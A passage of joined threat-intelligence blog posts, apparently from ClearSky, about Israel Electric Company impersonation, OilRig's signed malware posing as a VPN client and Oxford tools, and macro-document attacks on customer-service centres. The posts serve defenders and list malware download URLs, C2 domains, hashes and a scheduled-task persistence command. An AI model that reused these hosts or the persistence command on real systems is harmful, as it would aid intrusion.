<p><a href=""https://www.facebook.com/Pokemon-Go-1683341815318370/"">The page</a>, which is no longer available, had about one hundred followers &#8211; most were Arab Israelis and some were Jewish Israelis.</p>
<p>Only one post was published, with text in English and Hebrew.  Grammatical mistakes indicate the attackers are not native to both languages:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/unnamed.png""><img alt="""" class=""cta-box aligncenter wp-image-1674"" height=""313"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/unnamed.png"" width=""406"" /></a></p>
<p>The post linked to a malicious website hosted in yolasite.com (which is a legitimate website building and hosting platform):</p>
<p><strong>pokemonisrael.</strong>yolasite[.]com</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/pokemonisrael.yolasite.com_.jpg""><img alt="""" class=""alignnone wp-image-1678"" height=""466"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/pokemonisrael.yolasite.com_.jpg"" width=""460"" /></a></p>
<p>The button &#8211; &#8220;להורדה טלפון ומחשב&#8221; (literal translation – &#8220;To download phone and computer&#8221;) linked to a zip file in another website:</p>
<p><em>http://iec-co-il[.]com/iec/electricity/Pokemon-PC.zip</em></p>
<p>Note that the domain being impersonated is that of Israel Electric Company&#8217;s website (iec.co.il).</p>
<p>Pokemon-PC.zip (<a href=""https://www.virustotal.com/en/file/e5f3adf2e7d34a23f37e4ed754fd57f23d40f0bf67b12c6b9f854195362a75ab/analysis/"">40303cd6abe7004659ca3447767e4eb7</a>) contained Pokemon-PC.exe (<a href=""https://www.virustotal.com/en/file/0ab1b7eeffdaeb0d554a6378e09728fed6cf8cb22b8e797e1570ec01843ab83b/analysis/"">e45119a72677ed15ee0f04ef936a9803</a>), which at run time drops monitar.exe  (<a href=""https://www.virustotal.com/en/file/3a36bee1411da9ce3fd5a287ce43e8943e4b1fc5abe62926a0a3a9db9a4f2ee9/analysis/"">d3e0b129bad263e6c0dcb1a9da55978b</a>):</p>
<h2>Android phone malware</h2>
<p>The attackers also distributed a malicious app for Android devices &#8211; pokemon.apk (<a href=""https://www.virustotal.com/en/file/329c764c75e3cc257f25c5ae7b44fa9b0dcd8cada12f23e44a789d26c90e04df/analysis/"">3137448e0cb7ad83c433a27b6dbfb090</a>). This malware also had characteristics that impersonate IEC, such as the package name:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/iec-apk.jpg""><img alt="""" class="" wp-image-1624 aligncenter"" height=""124"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/iec-apk.jpg"" width=""422"" /></a></p>
<p>The application is a dropper that extracts and installs a spyware. The dropper does not ask for any permission during installation:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/mobile1.png""><img alt="""" class=""wp-image-1606 aligncenter"" height=""356"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/mobile1.png"" width=""232"" /></a></p>
<p>However, when the spyware is installed,  it asks for multiple sensitive permissions:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/mobile2.png""><img alt="""" class=""wp-image-1607 aligncenter"" height=""375"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/mobile2.png"" width=""237"" /></a></p>
<p>The victim ends up with two applications installed on their device. The Dropper, pretending to be a Pokemon Go app, adds an icon to the phone dashboard. However, it does not have any functionality, and when clicked, this error message is displayed:</p>
<p><strong>Error 505</strong><br />
Sorry, this version is not compatible with your android version.</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/mobile3.png""><img alt="""" class=""wp-image-1609 aligncenter"" height=""241"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/mobile3.png"" width=""250"" /></a></p>
<p>The dropper does not really check what android version is installed:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/mobile4.png""><img alt="""" class=""wp-image-1610 aligncenter"" height=""164"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/mobile4.png"" width=""465"" /></a></p>
<p style=""direction: ltr;"">The message is intended to make the victim believe that the Pokemon game does not work because of compatibility issues.</p>
<p>The victim is likely to uninstall the application at this point. However, because a second application was installed, the phone would stay infected unless it is uninstalled as well.</p>
<h2>Websites for Malware distribution</h2>
<p>Malware was also hosted in legitimate breached Israeli websites, such as this educational website:</p>
<p>http://www.bagrut3.org[.]il/upload/edu_shlishit/passwordlist.exe (<a href=""https://www.virustotal.com/en/file/15b5fb226689fdddc04c3e6ddeb84e3aae4ce009cc4c95f6fa68045033ca905f/analysis/"">defc340825cf56f18b5ba688e6695e68</a>)</p>
<p>and a small law firm&#8217;s website:</p>
<p>http://sheinin[.]co.il/MyPhoto.zip (<a href=""https://www.virustotal.com/en/file/9631d1574b11217ecdaa496696f25027a0fae7d83f4c3c1d71c2bf0dcbf9ea1e/analysis/1480916388/"">650fcd25a917b37485c48616f6e17712</a>)</p>
<p><em>In journey-in-israel[.]com,</em> the attackers inserted an exploit code for CVE-2014-6332 &#8211; a Windows code execution vulnerability. The exploit was copied from an online source, likely <a href=""https://gist.github.com/worawit/84ab41358b8465966224"">from here, </a>as the code included the same comments. The website also hosted this malware: <a href=""https://www.virustotal.com/en/file/09c4bd14f67ad09dd3a6cc7aea3dad824732b0837a82bae03db7b3b98cfe2cbd/analysis/"">afd5288d9aeb0c3ef7b37becb7ed4d5c</a>.</p>
<p>In other cases, the attackers registered and built malicious websites: users-management[.]com and <em>sourcef<strong>a</strong>rge[.]net</em> (similar to legitimate software website sourceforge.net<cite class=""_Rm"">)<span style=""font-style: normal;"">. The latter was redirecting to <em>journey-in-israel[.]com</em></span></cite><em> </em>and <em>iec-co-il[.]com </em>in May and July 2016, <a href=""https://passivetotal.org/search/sourcefarge.net"">according to PassiveTotal</a>:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/sourcefarge.jpg""><img alt="""" class=""wp-image-1701 aligncenter"" height=""303"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/sourcefarge.jpg"" width=""463"" /></a></p>
<p>Sample <a href=""https://www.virustotal.com/en/file/641275b120a014ef8534ead47d2f68ea96f62ab04c779dc57608109998afd9b6/analysis/"">24befa319fd96dea587f82eb945f5d2a</a>, potentially only a test file, is a self-extracting archive (SFX) that contains two files: a legitimate Putty installation and <em>link.html: </em></p>
<p><em><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/Screenshot_2.jpg""><img alt="""" class=""wp-image-1646 aligncenter"" height=""136"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/Screenshot_2.jpg"" width=""438"" /></a></em></p>
<p>When run, while putty is installed, the html file is opened in a browser and redirects to <em>http://tinyurl[.]com/jerhz2a</em> and then to <em>http://users-management[.]com/info/index_info.php?id=9775</em>. The last page 302 redirects to the website of an Israeli office supply company Mafil:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/Screenshot_1.jpg""><img alt="""" class=""wp-image-1647 aligncenter"" height=""309"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/Screenshot_1.jpg"" width=""409"" /></a></p>
<p>Sample <a href=""https://www.virustotal.com/en/file/79081e664393cad10c1f93835fd29fa36071e216b6e43bdc8f9650ef3eeae671/analysis/"">f6d5b8d58079c5a008f7629bdd77ba7f</a> , also a self-extracting archive, contained a decoy PDF document and a backdoor:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/iecmafil.jpg""><img alt="""" class=""wp-image-1652 aligncenter"" height=""150"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/iecmafil.jpg"" width=""465"" /></a></p>
<p>The PDF, named IEC.pdf, is a warranty document taken from Mafil&#8217;s public website. It is displayed to the victim while the malware (<a href=""https://www.virustotal.com/en/file/214bc5cde615305d5c0187581cbb3fcc8bbaab0f7cbfce424ea891f0b2cba79a/analysis/"">6aeb71d05a2f9b7c52ec06d65d838e82</a>) is infecting its computer:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/iec-pdf.jpg""><img alt="""" class=""wp-image-1660 aligncenter"" height=""246"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/iec-pdf.jpg"" width=""459"" /></a></p>
<h2>Windows Malware</h2>
<p>The attackers developed three malware types for Windows based computers:</p>
<ul>
<li><strong>Dropper</strong> &#8211; self-extracting archives that extract and run the backdoor, sometimes while opening a decoy PDF document or website.<br />
(For example: 6fa869f17b703a1282b8f386d0d87bd4)</li>
<li><strong>Trojan backdoor / downloader &#8211;  </strong>malware that collects information about the system and can download and execute other files. (909125d1de7ac584c15f81a34262846f)<br />
Some samples had two hardcoded command and control servers: iecrs[.]co and iecr[.]co (note once again the use of IEC in the domain name).</li>
<li><strong>Keylogger / screen grabber</strong> &#8211; records keystrokes and takes screenshots. The malware file is compiled Python code. (<a href=""https://www.virustotal.com/en/file/3a36bee1411da9ce3fd5a287ce43e8943e4b1fc5abe62926a0a3a9db9a4f2ee9/analysis/"">d3e0b129bad263e6c0dcb1a9da55978b</a>)</li>
</ul>
<p>An analysis of the malware and other parts of the campaign was <a href=""https://kc.mcafee.com/resources/sites/MCAFEE/content/live/PRODUCT_DOCUMENTATION/26000/PD26760/en_US/McAfee_Labs_Threat_Advisory_GazaCybergang.pdf"">published by Mcafee</a> in on November 11, 2016.</p>
<p>The latest known sample in this campaign (<a href=""https://www.virustotal.com/en/file/21023f43749e1efa394eeaa486a5cd332d64cabc9bb28a1640a252fd43062384/analysis/"">7ceac3389a5c97a3008aae9a270c706a</a>) has compilation timestamp of February 12, 2017.  It is dropped when &#8220;pdf file products israel electric.exe&#8221; (<a href=""https://www.virustotal.com/en/file/4961761f7768a802f2023523b73ed60bd178487177f72b58f9284632ae5e3bd2/analysis/"">c13c566b079258bf0782d9fb64612529</a>) is executed.</p>
<h2 id=""att123"">Attribution</h2>
<p>In a <a href=""https://kc.mcafee.com/resources/sites/MCAFEE/content/live/PRODUCT_DOCUMENTATION/26000/PD26760/en_US/McAfee_Labs_Threat_Advisory_GazaCybergang.pdf"">report </a>that covers other parts of the campaign, Mcafee attribute it to Gaza Cybergang (AKA Gaza Hacker Team AKA  Molerats). However, the report does not present strong evidence to support this conclusion.</p>
<p>While initially we thought the same, currently we cannot relate Operation Electric Powder to any known group. Moreover, besides Mohamad potentially being the name of the malware developer (based on PDB string found in multiple samples:  C:\Users\<strong>Mohammed.MU</strong>\Desktop\AM\programming\C\tsDownloader\Release\tsDownloader.pdb<br />
), we do not have evidence that the attackers are Arabs.</p>
<h2>Indicators of compromise</h2>
<ul>
<li>Indicators file:  <a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/Operation-Electric-Powder-indicators.csv"">Operation-Electric-Powder-indicators.csv</a> (also available on <a href=""https://www.passivetotal.org/projects/e37b0fb0-e207-35a7-c0d6-ae7df39c0708"">PassiveTotal</a>).<br />
Notably, all but one of the IP addresses in use by the attackers belong to German IT services provider &#8220;Accelerated IT Services GmbH&#8221; (AS31400):<br />
84.200.32.211<br />
84.200.2.76<br />
84.200.17.123<br />
84.200.68.97<br />
82.211.30.212<br />
82.211.30.186<br />
82.211.30.192</li>
<li><a href=""https://www.bsk-consulting.de/author/venom23/"">Florian Roth </a>shared a Yara rule to detect the downloader: <a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/Operation-Electric-Powder-yara.txt"">Operation-Electric-Powder-yara.txt</a></li>
<li>The graph below depicts the campaign infrastructure (click the image to see the full graph):<br />
<a href=""http://www.clearskysec.com/wp-content/uploads/2017/03/Electric-powder-maltego.jpg""><img alt="""" class=""alignnone wp-image-1686"" height=""274"" src=""http://www.clearskysec.com/wp-content/uploads/2017/03/maltego.jpg"" width=""416"" /></a></li>
<li>Live samples can be downloaded from the following link:<br />
https://ln.sync[.]com/dl/30e722bf0#f72zgiwk-zxcp3e9t-fa9jyakr-zpbf5hgg<br />
(Please email info@clearskysec.com to get the password.)</li>
</ul>
<h3>Acknowledgments</h3>
<p>This research was facilitated by <a href=""https://www.passivetotal.org/"">PassiveTotal </a>for threat infrastructure analysis, and by <a href=""https://shadowdragon.io/"">MalNet</a> for malware research.</p>",http://www.clearskysec.com/iec/
"Iranian Threat Agent OilRig Delivers Digitally Signed Malware, Impersonates University of Oxford","<p>Iranian threat agent OilRig has been targeting multiple organisations in Israel and other countries in the Middle East since the end of 2015. In recent attacks they set up a fake VPN Web Portal and targeted at least five Israeli IT vendors, several financial institutes, and the Israeli Post Office.</p>
<p>Later, the attackers set up two fake websites pretending to be a University of Oxford conference sign-up page and a job application website. In these websites they hosted malware that was digitally signed with a valid, likely stolen code signing certificate</p>
<p>Based on VirusTotal uploads, malicious documents content, and known victims &#8211; other targeted organisations are located in Turkey, Qatar, Kuwait, United Arab Emirates, Saudi Arabia, and Lebanon.<span id=""more-1495""></span></p>
<h2>Fake VPN Web Portal</h2>
<p>In one of the recent cases, the attackers sent the following email to individuals in targeted organisations:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/12/Screenshot_1.jpg""><img alt="""" class="" wp-image-1496 aligncenter"" height=""275"" src=""http://www.clearskysec.com/wp-content/uploads/2016/12/Screenshot_1.jpg"" width=""435"" /></a></p>
<p>The email was sent from a compromised account of an IT vendor. Similar emails were sent from other IT vendors in the same time period, suggesting the attackers had a foothold within their networks, or at least could get access to specific computers or email accounts.</p>
<p>The link provided in the malicious email led to a fake VPN Web Portal:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/12/login.jpg""><img alt="""" class=""wp-image-1499 aligncenter"" height=""231"" src=""http://www.clearskysec.com/wp-content/uploads/2016/12/login.jpg"" width=""425"" /></a></p>
<p>Upon logging in with the credentials provided in the email, the victim is presented with the following page:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/12/portal.jpg""><img alt="""" class=""wp-image-1500 aligncenter"" height=""159"" src=""http://www.clearskysec.com/wp-content/uploads/2016/12/portal.jpg"" width=""438"" /></a></p>
<p>The victim is asked to install the &#8220;VPN Client&#8221; (an .exe file), or, if download fails, to download a password protected zip (with the same .exe file inside).</p>
<p>The &#8220;VPN Client&#8221; is a legitimate Juniper VPN software bundled with <a href=""http://telussecuritylabs.com/threats/show/TSL20160530-07"">Helminth</a><a href=""http://telussecuritylabs.com/threats/show/TSL20160530-07"">,  </a>a malware in use by the OilRig threat agnet:</p>
<p>JuniperSetupClientInstaller.exe<br />
6a65d762fb548d2dc56cfde4842a4d3c (<a href=""https://www.virustotal.com/en/file/a367ccb9ca5a958d012e94ae8122feda9a1a7f23a0c84e2bc5ee35c834900b61/analysis/1483354486/"">VirusTotal link</a>)</p>
<p style=""direction: ltr;"">If the victim downloads and installs the file, their computer would get infected, while the legitimate VPN software is installed. The legitimate and the malicious installations can be seen in the process tree when the file is run in a Cuckoo sandbox. Malicious processes are marked red (click image to enlarge):</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2016/12/Process-Tree.png""><img class=""wp-image-1504 aligncenter"" height=""163"" src=""http://www.clearskysec.com/wp-content/uploads/2016/12/Process-Tree.png"" width=""702"" /></a></p>
<p>The following malicious files are dropped and run:</p>
<ul>
<li>C:\ProgramData\{2ED05C38-D464-4188-BC7F-F6915DE8D764}\OFFLINE\9A189DFE\C7B7C186\main.vbs<br />
dcac79d7dc4365c6d742a49244e81fd0</li>
<li>C:\Users\Public\Libraries\RecordedTV\DnE.ps1<br />
7fe0cb5edc11861bc4313a6b04aeedb2</li>
<li>C:\Users\Public\Libraries\RecordedTV\DnS.ps1<br />
3920c11797ed7d489ca2a40201c66dd4</li>
<li>&#8220;C:\Windows\System32\schtasks.exe&#8221; /create /F /sc minute /mo 3 /tn &#8220;GoogleUpdateTasksMachineUI&#8221; /tr C:\Users\Public\Libraries\RecordedTV\backup.vbs<br />
7528c387f853d96420cf7e20f2ad1d32</li>
</ul>
<p>Command and control server is located in the following domain:</p>
<p>tecsupport[.]in</p>
<p>A detailed analysis of the malware is provided in <span style=""text-decoration: underline;""><a href=""http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/"">two</a></span> <span style=""text-decoration: underline;""><a href=""http://researchcenter.paloaltonetworks.com/2016/10/unit42-oilrig-malware-campaign-updates-toolset-and-expands-targets/"">posts</a></span> by Palo Alto networks and in a <span style=""text-decoration: underline;""><a href=""https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html"">post</a></span> by FireEye, which wrote about previous campaigns by this threat agent.</p>
<p>(Note that Juniper networks was not compromised nor otherwise involved in the attack, except for the attackers using its name and publicly available software).</p>
<h2>Digitally signed malware</h2>
<p>The entire bundle (VPN client and malware) was digitally signed with a valid code signing certificate issued by Symantec to AI Squared, a legitimate software company that develops accessibility software:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/01/AI.jpg""><img alt="""" class=""wp-image-1515 aligncenter"" height=""241"" src=""http://www.clearskysec.com/wp-content/uploads/2017/01/AI.jpg"" width=""237"" /></a></p>
<p>Thumbprint: F340C0D841F9D99DBC289151C13391000366631C<br />
Serial number: 45 E4 7F 56 0B 01 B6 4E 68 39 5E 5D 79 2F 2E 09</p>
<p>Another Helminth sample, <a href=""https://www.virustotal.com/en/file/e404f9e9a7c4dc4cf44a4bf3e9738c10dfdc572e5184934af3ec3dd97e18b958/analysis/"">1c23b3f11f933d98febfd5a92eb5c715</a>, was signed with a different AI Squared code signing certificate:</p>
<p>Thumbprint: 92B8C0872BACDC226B9CE4D783D5CCAD61C6158A<br />
Serial number:62 E0 44 E7 37 24 61 2D 79 4B 93 AF 97 46 13 48</p>
<p>This suggest that the attackers had got a hold of an Ai Squared signing key, potentially after compromising their network. Alternatively, the attackers might have got Symantec to issue them a certificate under Ai Squared&#8217;s name.</p>
<p>[<strong>Update 11 February 2017:</strong> In a <a href=""http://www.aisquared.com/CertificateFix/"">notification </a>in its website, Ai Squared says that &#8220;The digital certificate used to certify newer ZoomText and Window-Eyes software products has been compromised. As a result, our certificate will be revoked on or around January 26th&#8221;]</p>
<h2>University of Oxford impersonation</h2>
<p>The attackers registered four domains impersonating The University of Oxford.</p>
<p><strong>oxford-symposia[.]com</strong>, is a fake Oxford conference registration website. Visitors are asked to download the &#8220;University Of Oxford Job Symposium Pre-Register Tool&#8221;:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/01/Oxford-Symposia.com_.jpg""><img class=""wp-image-1563 aligncenter"" height=""329"" src=""http://www.clearskysec.com/wp-content/uploads/2017/01/Oxford-Symposia.com3_.jpg"" width=""525"" /></a></p>
<p>The downloaded file (which is also signed with an AI Squared certificate), is a fake registration tool built by the attackers:</p>
<p>OxfordSymposiumRegTool.exe<br />
f77ee804de304f7c3ea6b87824684b33</p>
<p>If run by the victim, their computer would get infected, while they are shown this registration process:</p>
<p><img alt="""" class=""wp-image-1566 aligncenter"" height=""333"" src=""http://www.clearskysec.com/wp-content/uploads/2017/01/reg1.jpg"" width=""425"" /></p>
<p><img alt="""" class=""wp-image-1565 aligncenter"" height=""329"" src=""http://www.clearskysec.com/wp-content/uploads/2017/01/reg2.jpg"" width=""424"" /></p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/01/reg3.jpg""><img alt="""" class=""wp-image-1564 aligncenter"" height=""328"" src=""http://www.clearskysec.com/wp-content/uploads/2017/01/reg3.jpg"" width=""424"" /></a></p>
<p>Note that after completing the &#8220;registration process&#8221;, the victim is asked to send the form to an email address in <strong>oxford-careers[.]com</strong>, which also belongs to the attackers.</p>
<p>Previously the fake website linked to the following documents in a third fake Oxford domain, <strong>oxford[.]in</strong>:</p>
<p>http://oxford[.]in/downloads/ls1.doc<br />
http://oxford[.]in/downloads/ls2.doc<br />
http://oxford[.]in/downloads/ls3.doc<br />
http://oxford[.]in/downloads/ls4.do</p>
<p>The documents were unavailable during our research, and their content is unknown to us.</p>
<p>The attackers used a forth domain, <strong>oxford-employee[.]com</strong>, to host an &#8220;Oxford Job application&#8221; website:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/01/oxford-employee.com_.jpg""><img alt="""" class=""wp-image-1567 aligncenter"" height=""412"" src=""http://www.clearskysec.com/wp-content/uploads/2017/01/oxford-employee.com_.jpg"" width=""420"" /></a></p>
<p>Visitors are asked to &#8220;Download CV Creator&#8221; in order &#8220;To Join University of Oxford staff&#8221;. CV Creator is a malicious file hosted at http://www.oxford-careers[.]com/Files/OxfordCVCreator.exe :</p>
<p>OxfordCVCreator.exe<br />
5713c3c01067c91771ac70e193ef5419</p>
<p>When run, the victim is again presented with a tool created by the attackers, this time a &#8220;University Of Oxford Official CV Creator&#8221;:</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/01/ox.jpg""><img alt="""" class=""wp-image-1572 aligncenter"" height=""333"" src=""http://www.clearskysec.com/wp-content/uploads/2017/01/ox.jpg"" width=""431"" /></a></p>
<p>Both samples mentioned in this section had the following domain used for command and control:</p>
<p>updater[.]li</p>
<h2>Other incidents</h2>
<p style=""direction: ltr;"">In an earlier incident, the attackers sent a malicious excel file impersonating Israir, an Israeli Airline  (the content of the file was copied from the company&#8217;s public website and we have no indication of it being compromised or targeted):</p>
<p>Israel Airline.xls<br />
197c018922237828683783654d3c632a</p>
<div class=""s""><a href=""http://www.clearskysec.com/wp-content/uploads/2016/12/Israir.jpg""><img alt="""" class=""wp-image-1509 aligncenter"" height=""207"" src=""http://www.clearskysec.com/wp-content/uploads/2016/12/Israir.jpg"" width=""428"" /></a></div>
<div class=""s"">The file had a macro that if enabled by the user would infect its computer.</div>
<div class=""s""></div>
<div class=""s""><strong>In other incidents the attackers used the following files:</strong></div>
<div class=""s"">
<ul>
<li style=""direction: ltr;"">Special Offers.xls / Salary Employee 2016.xls<br />
f76443385fef159e6b73ad6bf7f086d6</li>
<li style=""direction: ltr;"">pic.xls<br />
3a5fcba80c1fd685c4b5085d9d474118<br />
<a href=""http://www.clearskysec.com/wp-content/uploads/2016/12/Special-Offers.jpg""><img alt="""" class=""wp-image-1510 aligncenter"" height=""312"" src=""http://www.clearskysec.com/wp-content/uploads/2016/12/Special-Offers.jpg"" width=""434"" /></a></li>
<li>People List.xls<br />
bd7d2efdb2a0f352c4b74f2b82e3c7bc</li>
<li>cv.xls<br />
72e046753f0496140b4aa389aee2e300</li>
<li>users.xls<br />
262bc259682cb48ce66a80dcc9a5d587</li>
<li>Employee Engagement Survey.xls<br />
726175e9aba421aa0f96cfc005664302</li>
<li>JuniperSetupClientInstaller.exe<br />
f8ce7e356e09de6a48dca9e51421b6f6</li>
<li>Project_Domain_No337<strong>.chm</strong><br />
1792cdd0c5397ff5df445d73276d1a50 (<a href=""https://www.virustotal.com/en/file/8cb80ac1f955bac9ccf67e843ddc15322b4aa70e8c98269a8a98a02df4cbd8b7/analysis/"">undetected as malicious by any antivirus on VirusTotal</a>)</li>
<li>gcaa_report_series15561<strong>.chm</strong><br />
d50ab63f4034c6f5eb356e3326320e66 (<a href=""https://www.virustotal.com/en/file/172b407b28dff5b2f1110545758f15185668c305b0b371c02c8870770f4f7e7a/analysis/"">undetected as malicious by any antivirus on VirusTotal</a>)</li>
</ul>
<h2>Infrastructure overlap with Cadelle and Chafer</h2>
<p>In December 2015, Symantec published a <a href=""https://www.symantec.com/connect/blogs/iran-based-attackers-use-back-door-threats-spy-middle-eastern-targets"">post </a>about &#8220;two Iran-based attack groups that appear to be connected, Cadelle and Chafer&#8221; that  &#8220;have been using Backdoor.Cadelspy and Backdoor.Remexi to spy on Iranian individuals and Middle Eastern organizations&#8221;.</p>
<p>Backdoor.Remexi, one of the malware in use by Chafer, had the following  command and control host:</p>
<p>87pqxz159.dockerjsbin[.]com</p>
<p>Interestingly, IP address  83.142.230.138, which serve as a command and control address for an OilRig related sample (3a5fcba80c1fd685c4b5085d9d474118), was pointed to by 87pqxz159.dockerjsbin[.]com as well.</p>
<p>This suggest that the two groups may actually be the same entity, or that they share resources in one why or another.</p>
</div>
<div class=""s"">
<h2>Indicators of compromise</h2>
<p>Indicators file: <a href=""http://www.clearskysec.com/wp-content/uploads/2017/01/oilrig-indicators.csv"">oilrig-indicators.csv</a> (also available on <a href=""https://www.passivetotal.org/projects/235a517a-ebb9-9293-ce0a-9ae630e32c98"">PassiveTotal</a>)</p>
<p>The graph below depicts the OilRig infrastructure (click to enlarge):</p>
<p><a href=""http://www.clearskysec.com/wp-content/uploads/2017/01/oilrig1.jpg""><img alt="""" class=""alignnone wp-image-1579"" height=""286"" src=""http://www.clearskysec.com/wp-content/uploads/2017/01/oilrig1.jpg"" width=""421"" /></a></p>
</div>
<div class=""s"">
<h3>Acknowledgments</h3>
<p>This research was facilitated by <a href=""https://www.passivetotal.org/"">PassiveTotal </a>for threat infrastructure analysis, and by <a href=""https://shadowdragon.io/"">MalNet</a> for malware research . We would like to thank <a href=""http://white-hat.co.il"">White-Hat</a>, Tom Lancaster of <a href=""https://www.paloaltonetworks.com/"">Palo Alto Networks</a>, Michael Yip of<a href=""https://www.strozfriedberg.com/""> Stroz Friedberg</a>, security researcher Marcus, and other security researchers and organizations who shared information and provided feedback.</p>
</div>",http://www.clearskysec.com/oilrig/
Attacks Against Customer Service Centers by Impersonation of Potential Clients,"<p>Hundreds of customer service centers have been targeted In a campaign going back at least to August 2016.</p>
<p>An email is sent to the &#8220;contact us&#8221; or &#8220;customer support&#8221; address of an online shop. The sender pretends to be a a customer that has a problem with the online shopping cart or is just asking to make sure products are available in stock.</p>
<p>The sender attaches a Word document to the email, and says that it lists the items he or she would like to purchase, or otherwise tries to entice the recipient to open the document.</p>
<p>For example:</p>
<p style=""padding-left: 60px;""><em>Hello Customer Support,</em></p>
<p style=""padding-left: 60px;""><em>I would like to place an order on &lt;name of organisation&gt;, however not certain if a couple items are in Stock. I have listed in the enclosed doc all I am interested in purchasing, can you review it and confirm if you have it in stock?</em></p>
<p style=""padding-left: 60px;""><em>Thank you for your assistance.</em></p>
<p style=""padding-left: 60px;""><em>Best Regards!</em></p>
<p>The Word documents contains Macro code that would infect the computer if enabled by the recipient.</p>
<p>In the samples we analysed, the malicious document communicated to the following address:</p>
<p>http://<strong>excelcenter[.]ro</strong>/port10/owalogon.asp</p>
<h2>Samples</h2>
<p>Below are 30 samples from the campaign, hundreds more exist. Note that the name of the malicious documents usually includes the domain name of the targeted company with a .doc suffix.</p>
<p>Ocovildovinil.Pt.doc<br />
df8dfdad1eef284ea90c30a903a4692bd6cc4fca0e3a5b682b07bf7de977cdfb</p>
<p>Oponeo.Pl.doc<br />
de2d892c281cba898cec22cd93ca26a22cb631f910c5c88d7bd4336b3cd8b1ee</p>
<p>Edelweissfin.Com.doc<br />
d274f0568f19066aa374339033607a07d8c2f243437edbbcfd4e30605a8ffe28</p>
<p>Eslite.Com.doc<br />
7bfffdb966111459a745a10a9f515025af299ea5f69ab727619b2551dbda9aa2</p>
<p>Outdoorsportstravel.Asia.doc<br />
865dbf107da63ff91fb3af3331b759f774203c20ddc833e8741227ca16ae2e48</p>
<p>Luxapool.Com.Au.doc<br />
cf8b8704a4cf106fff62d16d8b1986523b8d1e54cbed8dc10c766d9ec8799d8f</p>
<p>Biminitop.De.doc<br />
c4722b56730643f41b1829effbd31173a1fd84a0465d7bd54ee322c4c4b373f9</p>
<p>Blaudruckstoffe.De.doc<br />
4e0838501907cdc08c6dbc2f4ac2d77f4567bb59743f205259c777988b3bb41b</p>
<p>Innout.Com.doc<br />
6e64874bf64194d06201063c5afbc838019c804e6c22b3d30366e6f65e81a16e</p>
<p>Triodepot.Com.doc<br />
60a53af4e63a1205ccd766223c8bf4d77cebb252b3c8585113fbf8b7002c0717</p>
<p>Tailoredliving.Com.doc<br />
cf7746f4700e06091a92abf8a04bcf24108aa5159fffbb5125caaa2bea0440ad</p>
<p>Tsrhockey.Com.doc<br />
f9680d3ca4a9579c065fedbc51d5b4edf229568fc88062c7f35b5d07c3ed87ee</p>
<p>Priberam.Pt.doc<br />
5fbb01dae7d1a7791830b389ce9477fadc9796e1a254a22b639cdcb481031b9f</p>
<p>Pctvsystems.Com.doc<br />
56c5c92907e5b8cfa807356f11eb9cc6bc64fe4a49b1eb88ac7f30a339e5d6be</p>
<p>Sickkidsfoundation.Com.doc<br />
a712db7e2b022ee49c26fd1f188e9c9df7dd810c3e1f279e53435284acb44215</p>
<p>Agawa.Pl.doc<br />
450c4793d0b8ba6d3a7294812e371971de481e3a0ed174cd3a7e3bdfafaa6ee4</p>
<p>Sm-Moto.Com.doc<br />
ad30c40320561b2fe01420c287add294c4cdc459ee9a24fb4ccaa5a8f472267c</p>
<p>Guggenheiminvestments.Com.doc<br />
0f1770106a960329f978986209e5918e0e6539f80bcf2f3719d23ce39c5cc1b9</p>
<p>Voedingscentrum.Nl.doc<br />
9fe0bd7031f42252c6dc0b9ac41f33e252d7a067a8eb68ec51cf3c5cbb2acdcc</p>
<p>Danskebank.Fi.doc<br />
c816ff922125cf17db3780a6f0027b106d713e7fde4f63efd7f9d11f78b4114f</p>
<p>Thisisaka.Com.doc<br />
54e83553714a5fa6fc249f870c0200e5a679cd5ec2f17b3d3168bbcdf7eec869</p>
<p>Bristolwest.Com.doc<br />
67657c4bdb9968f14ceed73942bf71c341ae9264bd474884b363e840b5d60470</p>
<p>Dokomo.Be.doc<br />
eab3b8a4240bdebde634312d08737586fd1111651fc4980a1254439d436086fe</p>
<p>Rikstoto.No.doc<br />
59d4307d35f35cbca00131c43bb28b48acac3035f7b7ecfcc9b91009de8f7ef0</p>
<p>Maisondelin.Fr.doc<br />
525e40bd5997bfc48e4b76add60b21faff238d1913bf6964bdcbc3c753b71026</p>
<p>Moposport.Fi.doc<br />
8fac72b5c5063411645c7d7d5201b55aaf37fa3201029f783b7be1ab178732d1</p>
<p>Lichtkoepeltje.Nl.doc<br />
